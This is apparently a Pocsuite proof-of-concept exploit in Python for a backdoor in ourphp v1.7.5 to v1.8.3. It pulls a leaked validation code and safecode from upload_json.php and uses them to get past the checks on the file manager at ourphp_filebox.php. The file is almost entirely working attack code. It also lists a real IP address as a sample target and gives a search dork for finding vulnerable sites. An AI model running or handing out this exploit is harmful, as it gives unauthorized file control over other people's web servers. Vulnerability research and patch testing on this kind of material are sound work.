#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urlparse

from pocsuite.api.poc import POCBase, register, Output
from pocsuite.api.request import req


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'elloit'
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['https://xz.aliyun.com/t/4315']
    name = 'ourphp 后门漏洞'
    appPowerLink = 'http://www.ourphp.net'
    appName = 'ourphp'
    appVersion = 'v1.7.5-v1.8.3'
    vulType = '后门'
    desc = '''
    在function\editor\php\upload_json.php 中会暴露出生成的校验码，导致口令码和校验码泄露。
    在http://localhost:88/client/manage/ourphp_filebox.php?op=home&folder=./&validation=12345&code=QZRdvlYHlDUgqZubIGV9Mx46JCqmDNkmYHlDUg
    处，将泄露的口令码和 校验码 + 校验码第七位到第十二位之间的部分， 即可通过验证，对网站文件进行管理。
    '''
    samples = [
        "https://123.207.235.207"
    ]
    install_requires = ""
    search_keyword = '"Powered by ourphp"'

    def _verify(self):
        result = {}
        # 格式化URL
        url = urlparse.urlparse(self.url)
        vul_url = url.scheme + "://" + url.netloc + "/function/editor/php/upload_json.php?upload_file=hola"
        try:
            res = req.get(url=vul_url, timeout=(10, 15), verify=False)
            if res.status_code == 200:
                text = res.text.replace("<!--", "")
                text = text.replace("-->", "")
                validation = text.split("||")[0]
                safecode = text.split("||")[1]
                vul_url_check = url.scheme + "://" + url.netloc + \
                                "/client/manage/ourphp_filebox.php?op=home&folder=./&validation="+ validation +\
                                "&code=" + safecode + safecode[6:12]
                res_check = req.get(url=vul_url_check, timeout=(10, 15), verify=False)
                if res_check.status_code == 200 and "重命名" in res_check.content:
                    result["VerifyInfo"] = {}
                    result["VerifyInfo"]["URL"] = self.url
                    result["extra"] = {}
                    result["extra"]["validation"] = validation
                    result["extra"]["safecode"] = safecode
                    result["extra"]["info"] = self.get_info()
        except Exception as e:
            return self.parse_output(result)

        return self.parse_output(result)

    def _attack(self):
        self._verify()

    def get_info(self):
        try:
            page = req.get(self.url, timeout=(10, 15), verify=False).text
            title_left_index = page.find("<title>")
            title_right_index = page.find("</title>")
            title = page[title_left_index+7:title_right_index].strip()
        except:
            return ""
        return title

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
